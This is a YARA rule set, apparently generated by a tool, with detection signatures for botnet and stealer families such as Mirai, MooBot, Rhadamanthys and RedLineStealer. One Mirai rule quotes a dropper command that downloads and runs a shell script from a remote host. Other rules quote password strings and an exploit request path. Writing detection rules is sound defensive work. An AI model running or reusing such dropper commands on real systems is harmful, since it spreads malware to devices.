/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-28
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule Mirai_signature__fd0671db {
   meta:
      description = "_subset_batch - file Mirai(signature)_fd0671db.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fd0671dbeec7a6d277070a2fe32b2bb63e4e933e05aead7a65c2e0b8be056b52"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__fd0671db2 {
   meta:
      description = "_subset_batch - file Mirai(signature)_fd0671db.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "97b15eb8b293e5f3a1efb1b3da057cb1d2e91a03bbddcc0203f717ab932a4614"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule sig_97b15eb8b293e5f3a1efb1b3da057cb1d2e91a03bbddcc0203f717ab932a4614_97b15eb9 {
   meta:
      description = "_subset_batch - file 97b15eb8b293e5f3a1efb1b3da057cb1d2e91a03bbddcc0203f717ab932a4614_97b15eb8.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fd48897c282b6d96657bd559057cc5d2b78ad51f981025c94966ec229de4e180"
   strings:
      $s1 = " Y=0x0,N,G,n=0x0;G=X['charAt'](n++);~G&&(N=Y%0x4?N*0x40+G:G,Y++%0x4)?f+=String['fromCharCode'](0xff&N>>(-0x2*Y&0x6)):0x0){G=P['i" ascii /* score: '9.00'*/
      $s2 = "(function(W,D){var G=i,a=W();while(!![]){try{var V=parseInt(G(0x150,'BHVk'))/0x1*(parseInt(G(0x30b,'w0Ul'))/0x2)+-parseInt(G(0x1" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 70KB and
      all of them
}

rule Mirai_signature__fd48897c {
   meta:
      description = "_subset_batch - file Mirai(signature)_fd48897c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fd48897c282b6d96657bd559057cc5d2b78ad51f981025c94966ec229de4e180"
   strings:
      $s1 = "assword" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule MooBot_signature__9597ea18 {
   meta:
      description = "_subset_batch - file MooBot(signature)_9597ea18.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9597ea182ca5bcf4cfab4911710d1e60229028f268659ca871916a7fae62821f"
   strings:
      $s1 = "systemd" fullword ascii /* score: '11.00'*/
      $s2 = "/proc/%d/comm" fullword ascii /* score: '10.00'*/
      $s3 = "busybox" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule MooBot_signature__ecf42c86 {
   meta:
      description = "_subset_batch - file MooBot(signature)_ecf42c86.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ecf42c865d7c963d3ae0a4e13a013a0babc15ed177bc065882a9eeee0cb88573"
   strings:
      $s1 = "systemd" fullword ascii /* score: '11.00'*/
      $s2 = "/proc/%d/comm" fullword ascii /* score: '10.00'*/
      $s3 = "busybox" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__fed6d64b {
   meta:
      description = "_subset_batch - file Mirai(signature)_fed6d64b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fed6d64b61ec426f2e260fd6b9fd6343e6bad805d9695fc553c80fa05802ad46"
   strings:
      $x1 = "[LOCKSH] KILLING shell process PID %s (Parent PID: %d, cmdline: %s)" fullword ascii /* score: '33.50'*/
      $s2 = "[LOCKSH] SKIPPING SSH process PID %s (Parent PID: %d)" fullword ascii /* score: '21.00'*/
      $s3 = "[CLEAN] SKIPPING SSH daemon PID %d at %s" fullword ascii /* score: '10.00'*/
      $s4 = "[CLEAN] KILLING PID %d (failed real path check)" fullword ascii /* score: '10.00'*/
      $s5 = "#$%&'()*+,234567" fullword ascii /* score: '9.00'*/ /* hex encoded string '#Eg' */
      $s6 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__fed5e3d4 {
   meta:
      description = "_subset_batch - file Mirai(signature)_fed5e3d4.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fed5e3d463fd7910f72e2ceb6e8168e6d69f03506e8a605a1af53d6c2c0a8c8c"
   strings:
      $s1 = "POST /login.htm HTTP/1.1" fullword ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '29.00'*/
      $s3 = "command=login&username=%s&password=%s" fullword ascii /* score: '26.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '24.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root/ wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s7 = "tluafed" fullword ascii /* reversed goodware string 'default' */ /* score: '18.00'*/
      $s8 = "[0mPassword: " fullword ascii /* score: '16.00'*/
      $s9 = "/proc/%s/cmdline" fullword ascii /* score: '15.00'*/
      $s10 = "No child process" fullword ascii /* score: '15.00'*/
      $s11 = "Host: %s:554" fullword ascii /* score: '14.50'*/
      $s12 = "!openshell %d %8s" fullword ascii /* score: '12.00'*/
      $s13 = "/usr/sbin/syslogd" fullword ascii /* score: '12.00'*/
      $s14 = "[0mWrong password!" fullword ascii /* score: '12.00'*/
      $s15 = "[0mNo shell available" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule Rhadamanthys_signature__90ad2364f9a8390548bd0f3054022715_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_90ad2364f9a8390548bd0f3054022715(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ca2126bc7dc1381850cede41dfb525de7d3109842f9fe7dfb17ddd0918d46654"
   strings:
      $x1 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><d" ascii /* score: '45.00'*/
      $x2 = " unzip 1.01 Copyright 1998-2004 Gilles Vollant - http://www.winimage.com/zLibDll" fullword ascii /* score: '32.00'*/
      $x3 = " zip 1.01 Copyright 1998-2004 Gilles Vollant - http://www.winimage.com/zLibDll" fullword ascii /* score: '32.00'*/
      $s4 = "error: too few components in decoded image! (%d instead of %d)" fullword ascii /* score: '27.00'*/
      $s5 = "ncy><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processor" ascii /* score: '26.00'*/
      $s6 = "=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"fal" ascii /* score: '26.00'*/
      $s7 = "CREATE VIRTUAL TABLE CatItemFTS USING fts4(Name TEXT,Author TEXT,Description TEXT,Keywords TEXT,Path TEXT,GeoInfo TEXT,tokenize=" ascii /* score: '26.00'*/
      $s8 = "C:\\Projects\\Version 18\\Binary\\ReleaseWin32\\Zxl.pdb" fullword ascii /* score: '25.00'*/
      $s9 = "\\wicloader.exe" fullword wide /* score: '25.00'*/
      $s10 = "LIBJPEG12.DLL" fullword ascii /* score: '23.00'*/
      $s11 = "REGEXW.dll" fullword wide /* score: '23.00'*/
      $s12 = "REGEXW9.dll" fullword wide /* score: '23.00'*/
      $s13 = "fIEPACK.dll" fullword wide /* score: '23.00'*/
      $s14 = "/requestedExecutionLevel></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '22.00'*/
      $s15 = "ZDRAW5.EXE" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 28000KB and
      1 of ($x*) and 4 of them
}

rule MooBot_signature__4dd942e3 {
   meta:
      description = "_subset_batch - file MooBot(signature)_4dd942e3.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4dd942e3f33fff42e22fe7c04937fcf4c1572a823dad691cdfab4d0aee461b39"
   strings:
      $s1 = "systemd" fullword ascii /* score: '11.00'*/
      $s2 = "/proc/%d/comm" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule MooBot_signature__71c10bf4 {
   meta:
      description = "_subset_batch - file MooBot(signature)_71c10bf4.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "71c10bf444ce56a71863c5eb113d750f1d65429665ef9c7bf46b535a5025ac2e"
   strings:
      $s1 = "systemd" fullword ascii /* score: '11.00'*/
      $s2 = "/proc/%d/comm" fullword ascii /* score: '10.00'*/
      $s3 = "#$%&'()*+,234567" fullword ascii /* score: '9.00'*/ /* hex encoded string '#Eg' */
      $s4 = "busybox" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule MooBot_signature__d65b22a9 {
   meta:
      description = "_subset_batch - file MooBot(signature)_d65b22a9.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d65b22a9a65b19d4e0834b859e24b8c0df764f353ae69b71d740d2f7c3bc82b8"
   strings:
      $s1 = "systemd" fullword ascii /* score: '11.00'*/
      $s2 = "/proc/%d/comm" fullword ascii /* score: '10.00'*/
      $s3 = "busybox" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule PondRAT_signature__9cab062b6407ceff6e9df9399380da8b_imphash_ {
   meta:
      description = "_subset_batch - file PondRAT(signature)_9cab062b6407ceff6e9df9399380da8b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6510d460395ca3643133817b40d9df4fa0d9dbe8e60b514fdc2d4e26b567dfbd"
   strings:
      $s1 = "[+] TLS callbacks executed (DLL_PROCESS_ATTACH)." fullword ascii /* score: '27.00'*/
      $s2 = "[-] An error is occured when tying to get the import descriptor !" fullword ascii /* score: '25.00'*/
      $s3 = "[+] DLL LOADER" fullword ascii /* score: '22.00'*/
      $s4 = "[-] An error is occured when trying to get DLL's data !" fullword ascii /* score: '21.00'*/
      $s5 = "[+] dllmain have been called (DLL_PROCESS_ATTACH)." fullword ascii /* score: '20.00'*/
      $s6 = "[-] An error is occured when tying to load %s DLL !" fullword ascii /* score: '19.00'*/
      $s7 = "[-] An error is occured when tying to get the import section !" fullword ascii /* score: '19.00'*/
      $s8 = "[+] Import in %s section." fullword ascii /* score: '14.00'*/
      $s9 = "[+] DLL loaded successfully." fullword ascii /* score: '13.00'*/
      $s10 = "[+] DLL's data at 0x%p" fullword ascii /* score: '13.00'*/
      $s11 = "[+] The PE image correspond to a DLL." fullword ascii /* score: '13.00'*/
      $s12 = "[-] The DLL is not a valid PE file !" fullword ascii /* score: '13.00'*/
      $s13 = "[-] The PE file is not a DLL !" fullword ascii /* score: '13.00'*/
      $s14 = "[-] An error occured when trying to allocate memory for the PE file content !" fullword ascii /* score: '12.00'*/
      $s15 = "[-] An error is occured when trying to call the DLL's entrypoint !" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      8 of them
}

rule Rhadamanthys_signature__0dac91d571710abf1256a743c4b815f1_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_0dac91d571710abf1256a743c4b815f1(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "026fbda0af33aa924b28341012a8b58bfa497311bb910d373958f81f81b27025"
   strings:
      $x1 = "Downloaded new DBGHELP.DLL\"Failed to download new DBGHELP.DLLForcing download of DBGHELP.DLLDeleting existing Minidump file M" wide /* score: '31.00'*/
      $s2 = "Failed to launch BsSndRpt.exe3DBGHELP.DLL too old. Failed to create Minidump file:DBGHELP.DLL does not exist. Failed to create M" wide /* score: '29.00'*/
      $s3 = "http://www.bugsplatsoftware.com/files/dbghelp.dll" fullword ascii /* score: '26.00'*/
      $s4 = "BugSplatHD.exe /p %ld /c \"%s\" /a \"%s\" /v \"%s\"" fullword ascii /* score: '25.00'*/
      $s5 = "C:\\www\\src\\BugSplat\\bin\\BugSplat.pdb" fullword ascii /* score: '25.00'*/
      $s6 = "BugSplatRc.dll" fullword ascii /* score: '23.00'*/
      $s7 = "BugSplat.dll" fullword ascii /* score: '23.00'*/
      $s8 = "Crash reporting module, BugSplat.DLL" fullword wide /* score: '23.00'*/
      $s9 = "BugSplat.DLL" fullword wide /* score: '23.00'*/
      $s10 = "BugSplat.dll: %s  %s" fullword ascii /* score: '22.00'*/
      $s11 = "BsSndRpt.exe" fullword ascii /* score: '22.00'*/
      $s12 = "bugsplat.log" fullword ascii /* score: '19.00'*/
      $s13 = "BugSplat.dll: " fullword ascii /* score: '19.00'*/
      $s14 = "Launching BsSndRpt.exe" fullword wide /* score: '19.00'*/
      $s15 = "Full Memory Dump Created" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__cf127c635698075a36f068dac0292287_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_cf127c635698075a36f068dac0292287(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7cece8e173d5ecb2273ec0d10b341ad5a78b25a78e619a940fd0c758887755d5"
   strings:
      $s1 = "libgcc.dll" fullword ascii /* score: '23.00'*/
      $s2 = "libHarfBuzzSharp.dll" fullword wide /* score: '23.00'*/
      $s3 = "_ZN14__gnu_internal9get_mutexEh" fullword ascii /* score: '20.00'*/
      $s4 = "_ZNSt3pmr26synchronized_pool_resource15_M_alloc_tpoolsERSt10lock_guardISt12shared_mutexE" fullword ascii /* score: '18.00'*/
      $s5 = "_ZNSt3pmr26synchronized_pool_resource22_M_alloc_shared_tpoolsERSt10lock_guardISt12shared_mutexE" fullword ascii /* score: '18.00'*/
      $s6 = "_ZSt25notify_all_at_thread_exitRSt18condition_variableSt11unique_lockISt5mutexE" fullword ascii /* score: '18.00'*/
      $s7 = "_ZNSt10filesystem19temp_directory_pathB5cxx11ERSt10error_code" fullword ascii /* score: '17.00'*/
      $s8 = "_ZNSt10filesystem19temp_directory_pathERSt10error_code" fullword ascii /* score: '17.00'*/
      $s9 = "_Z26_txnal_logic_error_get_msgPv" fullword ascii /* score: '17.00'*/
      $s10 = "_ZNSt23_Sp_counted_ptr_inplaceINSt10filesystem7__cxx1116filesystem_error5_ImplESaIS3_ELN9__gnu_cxx12_Lock_policyE2EE14_M_get_del" ascii /* score: '15.00'*/
      $s11 = "_Z28_txnal_runtime_error_get_msgPv" fullword ascii /* score: '15.00'*/
      $s12 = "_ZTSSt11_Mutex_baseILN9__gnu_cxx12_Lock_policyE2EE" fullword ascii /* score: '15.00'*/
      $s13 = "_ZNKSt12__shared_ptrIKNSt10filesystem7__cxx1116filesystem_error5_ImplELN9__gnu_cxx12_Lock_policyE2EE3getEv" fullword ascii /* score: '15.00'*/
      $s14 = "_ZNKSt12__shared_ptrIKNSt10filesystem7__cxx1116filesystem_error5_ImplELN9__gnu_cxx12_Lock_policyE2EE14_M_get_deleterERKSt9type_i" ascii /* score: '15.00'*/
      $s15 = "St11_Mutex_baseILN9__gnu_cxx12_Lock_policyE2EE" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule Mozi_signature__f7375f0a {
   meta:
      description = "_subset_batch - file Mozi(signature)_f7375f0a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f7375f0ae0287b6aa966ae8ade9cadbd13821544a242f8418554ec462b71f8fd"
   strings:
      $s1 = "User-Agent:*" fullword ascii /* score: '17.00'*/
      $s2 = "PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
      $s3 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
      $s4 = "Lks.comj+0 " fullword ascii /* score: '14.00'*/
      $s5 = "Host: 127.0" fullword ascii /* score: '9.00'*/
      $s6 = "OST /GponForm/diag_" fullword ascii /* score: '8.00'*/
      $s7 = "ddeefft" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Rhadamanthys_signature__b1360b55502c86aaa9ee5d567fd20efa_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_b1360b55502c86aaa9ee5d567fd20efa(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d7d8e962aec227374b5912300205b19de0be5a47dd1d1ba955d961ca2c8ecf89"
   strings:
      $x1 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker" ascii /* score: '45.00'*/
      $x2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" wide /* base64 encoded string '                       ' */ /* reversed goodware string 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' */ /* score: '38.50'*/
      $x3 = "\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" langua" ascii /* score: '36.00'*/
      $x4 = "  consultationcommunity ofthe nationalit should beparticipants align=\"leftthe greatestselection ofsupernaturaldependent onis me" ascii /* score: '35.00'*/
      $x5 = "api-ms-win-downlevel-shell32-l1-1-0.dll" fullword wide /* reversed goodware string 'lld.0-1-1l-23llehs-levelnwod-niw-sm-ipa' */ /* score: '35.00'*/
      $x6 = "NetLog events and metadata, including sensitive information such as hostnames, URLs, HTTP headers and other identifiable informa" ascii /* score: '33.00'*/
      $s7 = "Failed to GetModuleHandle Iphlpapi.dll" fullword ascii /* score: '28.00'*/
      $s8 = "keywords\" content=\"w3.org/1999/xhtml\"><a target=\"_blank\" text/html; charset=\" target=\"_blank\"><table cellpadding=\"autoc" ascii /* score: '28.00'*/
      $s9 = ". $10Failed to run setup with elevated privileges. $10Failed to run setup with elevated privileges. $1GNo se ha podido ejecutar " wide /* score: '28.00'*/
      $s10 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s11 = "Crash key dumping is inherently thread-unsafe so it's disabled in official builds." fullword ascii /* score: '27.00'*/
      $s12 = "Check (v & (kMuWriter | kMuReader)) != (kMuWriter | kMuReader) failed: %s: Mutex corrupt: both reader and writer lock held: %p" fullword ascii /* score: '26.50'*/
      $s13 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker" ascii /* score: '26.00'*/
      $s14 = "Failed to GetProcessUser " fullword ascii /* score: '26.00'*/
      $s15 = "ExecuteAppCommand" fullword ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      1 of ($x*) and all of them
}

rule Pony_signature__fd3adc5077b3a19a8142a087013e6a1b_imphash_ {
   meta:
      description = "_subset_batch - file Pony(signature)_fd3adc5077b3a19a8142a087013e6a1b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "031e095f10661205df66520a7bedd5414e2b4b1aa132bc615c4f9bc8f04f2d70"
   strings:
      $s1 = "Imp*vLoggOn" fullword ascii /* score: '9.00'*/
      $s2 = "assword" fullword ascii /* score: '8.00'*/
      $s3 = "footbay" fullword ascii /* score: '8.00'*/
      $s4 = "shadowpkms" fullword ascii /* score: '8.00'*/
      $s5 = "letmein" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule POOLRAT_signature__e83eed5de95f7cdf1691cf06ab0d3b19_imphash_ {
   meta:
      description = "_subset_batch - file POOLRAT(signature)_e83eed5de95f7cdf1691cf06ab0d3b19(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f4d8e1a687e7f7336162d3caed9b25d9d3e6cfe75c89495f75a92ca87025374b"
   strings:
      $s1 = "--%s%sContent-Disposition: form-data; name=\"session\"%s%s%u%s" fullword ascii /* score: '19.00'*/
      $s2 = "--%s%sContent-Disposition: form-data; name=\"token\"%s%s%u%s" fullword ascii /* score: '19.00'*/
      $s3 = "--%s%sContent-Disposition: form-data; name=\"upload\"; filename=\"plain.jpg\"%sContent-Type: application/octet-stream%s%s" fullword ascii /* score: '17.00'*/
      $s4 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" fullword ascii /* score: '17.00'*/
      $s5 = "--%s%sContent-Disposition: form-data; name=\"uid\"%s%s%u%s" fullword ascii /* score: '16.00'*/
      $s6 = "--%s%sContent-Disposition: form-data; name=\"action\"%s%s%s%s" fullword ascii /* score: '16.00'*/
      $s7 = "Create MainThread Error" fullword ascii /* score: '10.00'*/
      $s8 = "Content-length: ^^^^^^^^^^^^^^^^" fullword ascii /* score: '9.00'*/
      $s9 = "Content-Type: multipart/form-data;boundary=" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__415fd5ea {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_415fd5ea.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "415fd5eaa594b70484e8648697e33818d741e37c396d4aa31ea4fdbe767be93c"
   strings:
      $s1 = "gerg.exe" fullword wide /* score: '22.00'*/
      $s2 = "user@example.com" fullword wide /* score: '21.00'*/
      $s3 = "7777777778" ascii /* score: '17.00'*/ /* hex encoded string 'wwwwx' */
      $s4 = "XVVVVVVVVVW" fullword ascii /* base64 encoded string ']UUUUUUU' */ /* score: '16.50'*/
      $s5 = "Ampersand '&' should be encoded as '&amp;'" fullword wide /* score: '16.00'*/
      $s6 = "Attribute syntax error - attributes should be in format: name=\"value\"" fullword wide /* score: '15.00'*/
      $s7 = "gerg.pdb" fullword ascii /* score: '14.00'*/
      $s8 = "oVVVVVVVVVVVVVVo" fullword ascii /* base64 encoded string 'UUUUUUUUUUZ' */ /* score: '14.00'*/
      $s9 = "HTML_Validation_Errors.txt" fullword wide /* score: '14.00'*/
      $s10 = "Export Complete" fullword wide /* score: '12.00'*/
      $s11 = "get_SaveValidationReports" fullword ascii /* score: '12.00'*/
      $s12 = "get_HTMLVersion" fullword ascii /* score: '12.00'*/
      $s13 = "Line {0}: {1} - {2}" fullword wide /* score: '12.00'*/
      $s14 = "Help - HTML Validator" fullword wide /* score: '12.00'*/
      $s15 = "Text files (*.txt)|*.txt|All files (*.*)|*.*" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule Rhadamanthys_signature__19ab2a3bf985a16d9b63f63569b16164_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_19ab2a3bf985a16d9b63f63569b16164(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "31376b17f7fcb7ff713789f13dc9374db77dad2d569c3dd0ae793b61a4a736f1"
   strings:
      $x1 = "%SystemRoot%\\system32\\conhost.exe" fullword wide /* score: '32.00'*/
      $x2 = "%SystemRoot%\\system32\\taskhost.exe" fullword wide /* score: '32.00'*/
      $s3 = "C:\\vmagent_new\\bin\\joblist\\308926\\out\\Release\\WDPayPro.pdb" fullword ascii /* score: '30.00'*/
      $s4 = "C:\\Windows\\system32\\LaunchWinApp.exe" fullword wide /* score: '29.00'*/
      $s5 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x8" ascii /* score: '27.00'*/
      $s6 = "%SystemRoot%\\system32\\wininit.exe" fullword wide /* score: '27.00'*/
      $s7 = "cloudcom2.dll" fullword wide /* score: '26.00'*/
      $s8 = "SomProxy.dll" fullword wide /* score: '26.00'*/
      $s9 = "360Common.dll" fullword wide /* score: '26.00'*/
      $s10 = "360TSCommon.dll" fullword wide /* score: '26.00'*/
      $s11 = "http\\shell\\%s\\command" fullword wide /* score: '25.50'*/
      $s12 = "https://addons.opera.com/%s/extensions/details/360-internet-protection/?display=%s" fullword wide /* score: '25.00'*/
      $s13 = "deepscan\\cloudcom2.dll" fullword wide /* score: '24.00'*/
      $s14 = "sites.dll" fullword wide /* score: '23.00'*/
      $s15 = "360base.dll" fullword wide /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__bc626f92bc8a8d61a61d3ac2a724bfc6_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_bc626f92bc8a8d61a61d3ac2a724bfc6(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "61c07d0dc96f30436a479e09f15615ab96014d3c3159861995f19846e05f284b"
   strings:
      $s1 = "P:\\Target\\x86\\ship\\nlg\\x-none\\msspell7.pdb" fullword ascii /* score: '27.00'*/
      $s2 = "msspell7.dll" fullword wide /* score: '23.00'*/
      $s3 = ".?AVCPostProcessor@Speller@@" fullword ascii /* score: '20.00'*/
      $s4 = "c2r32.dll" fullword wide /* score: '20.00'*/
      $s5 = "_GetPerfhostHookVersion@0" fullword ascii /* score: '17.00'*/
      $s6 = ".?AVITextProcessor@Speller@@" fullword ascii /* score: '15.00'*/
      $s7 = ".?AVCSuggestProcessor@Speller@@" fullword ascii /* score: '15.00'*/
      $s8 = ".?AVCVerifyProcessor" fullword ascii /* score: '15.00'*/
      $s9 = "ll7.pdb" fullword ascii /* score: '11.00'*/
      $s10 = "Cdller@@" fullword ascii /* score: '9.00'*/
      $s11 = ".?AV?$lookahead_assertion@V?$_String_con" fullword ascii /* score: '9.00'*/
      $s12 = "dddddddddddededededededededededededdedededdddddeedeedeedeedeeddddddddddddddddfdffddeffeeee" ascii /* score: '8.00'*/
      $s13 = "yaaaaaaccccccccdd" fullword wide /* score: '8.00'*/
      $s14 = "aaiioouuuuuuuuuu" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule NetSupport_signature__6a91eb82bfd19d2706c7d43c46f7064e_imphash_ {
   meta:
      description = "_subset_batch - file NetSupport(signature)_6a91eb82bfd19d2706c7d43c46f7064e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "65219d70f5c46785626f4bc9c88ea20ba4dd533c7e9af5cb166eeee07d4753ff"
   strings:
      $s1 = "hostfxr.dll" fullword wide /* score: '28.00'*/
      $s2 = "This executable is not bound to a managed DLL to execute. The binding value is: '%s'" fullword wide /* score: '25.00'*/
      $s3 = "PixiEditor.Desktop.dll" fullword wide /* score: '23.00'*/
      $s4 = "D:\\a\\_work\\1\\s\\artifacts\\obj\\win-x64.Release\\corehost\\apphost\\standalone\\apphost.pdb" fullword ascii /* score: '22.00'*/
      $s5 = "The managed DLL bound to this executable is: '%s'" fullword wide /* score: '20.00'*/
      $s6 = "Showing error dialog for application: '%s' - error code: 0x%x - url: '%s' - details: %s" fullword wide /* score: '19.00'*/
      $s7 = "Failed to resolve full path of the current executable [%s]" fullword wide /* score: '18.00'*/
      $s8 = "--- Invoked %s [version: %s] main = {" fullword wide /* score: '18.00'*/
      $s9 = "333333333222" ascii /* score: '17.00'*/ /* hex encoded string '33332"' */
      $s10 = "       For more details visit https://learn.microsoft.com/en-us/windows/win32/sbscs/application-manifests -->" fullword ascii /* score: '17.00'*/
      $s11 = "https://go.microsoft.com/fwlink/?linkid=798306" fullword wide /* score: '17.00'*/
      $s12 = "The managed DLL bound to this executable could not be retrieved from the executable image." fullword wide /* score: '17.00'*/
      $s13 = "Could not load 'kernel32.dll': %u" fullword wide /* score: '16.00'*/
      $s14 = "Download the .NET runtime:" fullword wide /* score: '16.00'*/
      $s15 = "  - Installing .NET prerequisites might help resolve this problem." fullword wide /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      8 of them
}

rule QuasarRAT_signature__ec88eebf1d94c460a6462466922e0be7_imphash_ {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_ec88eebf1d94c460a6462466922e0be7(imphash).exe"
